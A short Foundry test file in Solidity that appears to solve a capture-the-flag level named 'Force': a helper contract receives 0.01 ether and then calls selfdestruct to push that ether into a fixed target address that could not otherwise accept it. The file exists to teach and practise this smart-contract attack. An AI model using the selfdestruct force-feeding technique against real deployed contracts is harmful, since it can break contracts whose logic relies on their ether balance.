// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";

contract ForceTest is Test {
    address public addr = 0xd5F7918faca70377e17caF303b70586c5c22eAB8;

    function testAttack() public {
        Temp temp = new Temp();
        payable(address(temp)).transfer(0.01 ether);
        assertEq(addr.balance, 0);
        console.log(addr.balance);
        temp.attack();
        assertTrue(addr.balance > 0);
        console.log(addr.balance);
    }
}

contract Temp {
    address public addr = 0xd5F7918faca70377e17caF303b70586c5c22eAB8;

    function attack() public {
        selfdestruct(payable(addr));
    }

    receive() external payable {}
}
